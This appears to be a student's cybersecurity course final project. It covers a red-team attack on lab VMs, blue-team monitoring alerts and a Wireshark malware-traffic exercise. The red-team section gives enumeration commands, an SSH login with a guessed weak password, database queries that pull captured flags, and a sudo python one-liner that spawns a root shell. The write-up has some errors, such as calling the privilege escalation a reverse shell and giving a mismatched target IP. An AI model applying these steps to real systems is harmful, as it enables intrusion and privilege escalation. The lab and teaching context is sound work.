# Final-Project
Red Team, Blue Team, and Network Analysis

# Red Team: Summary of Operations
## Table of Contents
### Exposed Services
### Critical Vulnerabilities
### Exploitation
### Exposed Services
<details>
  <summary> NMAP Scan </summary>
  <pre>
NMAP:
 Nmap scan results for each machine reveal the below services and OS details:
$ nmap -sV 192.168.1.*
  #Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-26 15:14 PST
Nmap scan report for 192.168.1.1
Host is up (0.00054s latency).
Not shown: 995 filtered ports
PORT 	STATE SERVICE   	VERSION
135/tcp  open  msrpc     	Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2179/tcp open  vmrdp?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
MAC Address: 00:15:5D:00:04:0D (Microsoft)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
Nmap scan report for 192.168.1.100
Host is up (0.00039s latency).
Not shown: 998 closed ports
PORT 	STATE SERVICE VERSION
22/tcp   open  ssh 	OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
9200/tcp open  http	Elasticsearch REST API 7.6.1 (name: elk; cluster: elasticsearch; Lucene 8.4.0)
MAC Address: 4C:EB:42:D2:D5:D7 (Intel Corporate)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
Nmap scan report for 192.168.1.105
Host is up (0.00088s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh 	OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http	Apache httpd 2.4.29
MAC Address: 00:15:5D:00:04:0F (Microsoft)
Service Info: Host: 192.168.1.105; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
Nmap scan report for 192.168.1.110
Host is up (0.00091s latency).
Not shown: 995 closed ports
PORT	STATE SERVICE 	VERSION
22/tcp  open  ssh     	OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp  open  http    	Apache httpd 2.4.10 ((Debian))
111/tcp open  rpcbind 	2-4 (RPC #100000)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 00:15:5D:00:04:10 (Microsoft)
Service Info: Host: TARGET1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
Nmap scan report for 192.168.1.115
Host is up (0.00038s latency).
Not shown: 995 closed ports
PORT	STATE SERVICE 	VERSION
22/tcp  open  ssh     	OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp  open  http    	Apache httpd 2.4.10 ((Debian))
111/tcp open  rpcbind 	2-4 (RPC #100000)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 00:15:5D:00:04:11 (Microsoft)
Service Info: Host: TARGET2; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
Nmap scan report for 192.168.1.90
Host is up (0.0000070s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh 	OpenSSH 8.1p1 Debian 5 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (6 hosts up) scanned in 28.24 seconds
 
This scan identifies the services below as potential points of entry:
Target 1 192.168.1.100
22/tcp  open  ssh     	OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp  open  http    	Apache httpd 2.4.10 ((Debian))
111/tcp open  rpcbind 	2-4 (RPC #100000)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
</pre>
</details>

The following vulnerabilities were identified on each target:
Target 1
<br> HTTP Port access
<br> Wordpress site using WPscan
<br> Dirb scan
<br> `Wpscan –url http://192.168.1.110/wordpress –enumerate u`
<br> SSH into an account with open port 22
<br> Ssh michael@192.168.1.110 with password michael
<br>Navigate to /var/www/http/wordpress
<br> `cat/nano/less wp-config.php`

Port 80 is unsecured (HTTP) and finding it as a Wordpress Site created an opportunity for exploit. Additionally, Port 22 is also open so SSH services are accessable. 

## Exploitation

The Red Team was able to penetrate Target 1 and retrieve the following confidential data:
Target 1
### Flag 1
Found in service.html:

Flag1.txt:
flag1{b9bbcb33e11b80be759c4e844862482d}

### Flag 2 Exploit Used
Getting into michael’s account via ssh; one avenue of searching is to grep 
I ended up lessing some of the html files and found the flag

Flag2.txt:
flag2{fc3fd58dcdad9ab23faca6e9a36e581c}


### Flag 3 Exploit Used
Found in the www directory

Flag3.txt
flag3{afc01ab56b50591e7dccf93122770cd2}
```
michael@target1:~$ mysql -u root -p

mysql> show databases;
mysql> use wordpress;
mysql> show tables;
mysql> select * from wp_posts;
```
Found in the mySQL command: wordpress database in the wp_posts table
### Flag 4 Exploit Used

Flag4.txt
Flag4{715dea6c055b9fe3337544932f2941ce}
`sudo python -c 'import os; os.system("/bin/sh")'`

This reverse shells from steven user to root privilege
'Sudo -ls' shows what command can be executed by user: which steven can execute python scripts without passwords in sudo.
Using cd: it took me to the root home folder and flag4.txt was in there



# Blue Team: Summary of Operations
## Table of Contents
### Network Topology
### Description of Targets
### Monitoring the Targets
### Patterns of Traffic & Behavior

## Network Topology
The following machines were identified on the network:
Name of VM 1: Kali
Operating System:Kali
Purpose: Red team usage; use to attack Target 1 and 2
IP Address: 192.168.1.90
Name of VM 2: Target 1
Operating System: Linux 3.2-4.9
Purpose: Hosts website RavenSecurity
IP Address: 192.168.1.110
Name of VM 3: Target 2
Operating System: Linux 3.2-4.9
Purpose: Second Box to attack
IP Address: 192.168.1.115
Name of VM 4: ELK
Operating System: No scans on NMAP
Purpose: Generates logs
IP Address: 192.168.1.100
Name of VM 5: Capstone
Operating System: Linux 3.2-4.9
Purpose: Practice alerts
IP Address: 192.168.1.105
Description of Targets
The target of this attack was: Target 1 (192.168.1.110).
Target 1 is an Apache web server and has SSH enabled, so ports 80 and 22 are possible ports of entry for attackers. As such, the following alerts have been implemented:
Monitoring the Targets
Traffic to these services should be carefully monitored. To this end, we have implemented the alerts below:
## Name of Alert 1:
Packetbeat: HTTP Response Code
Alert 1 is implemented as follows:
Metric: HTTP response code
Threshold: Above 400
Vulnerability Mitigated: Determines an alert based on http response code.
Reliability: Medium, depending on how active the site is used. There were a few pings that triggered this alert.
## Name of Alert 2
Packetbeat: HTTP Request Bytes
Alert 2 is implemented as follows:
Metric: Packetbeat: HTTP request bytes threshold
Threshold: 3500
Vulnerability Mitigated: Data accessing thresholds.
Reliability: Low: The majority of alerts, if I am correctly reading my Kibana, is from request bytes.
## Name of Alert 3
Metricbeat CPU Utilization
Alert 3 is implemented as follows:
Metric: Metricbeat: CPU process power
Threshold: Over 0.5%
Vulnerability Mitigated: Mitigates excessive task power which might seem abnormal to regular functions.
Reliability: High: most of the pings were of less than .3% of cpu utilization. 

# Network Analysis: Summary of Operations
## Case: Time Thieves
### Setup: At least two users on the network have been wasting time on YouTube. Usually, IT wouldn't pay much mind to this behavior, but it seems these people have created their own web server on the corporate network. So far, Security knows the following about these time thieves: They have set up an Active Directory network. They are constantly watching videos on YouTube. Their IP addresses are somewhere in the range 10.6.12.0/24.

### You must inspect your traffic capture to answer the following questions:

#### Using Wireshark and creating a 15 minute scan of the network, I was able to derive the following:

*What is the domain name of the users' custom site?*

10.6.12.157(DESKTOP-86J4BX IP address) > 10.6.12.12 (DC IP Address): frank-n-ted.com

*What is the IP address of the Domain Controller (DC) of the AD network?*

From “Frank-n-Ted-DC.frank-n-ted.com”: The IP Address is 10.6.12.12

*What is the name of the malware downloaded to the 10.6.12.203 machine? Once you have found the file, export it to your Kali machine's desktop.*

There is a file that was uploaded called june11.dll that is concerning. dlls are libraries that contain code that can be executed and given that this one was downloaded by a malicious actor and one of only a few items downloaded, it was investigated.

*Upload the file to VirusTotal.com. What kind of malware is this classified as?*

The Malware is considered a Trojan Spy from many of the detection sites. 
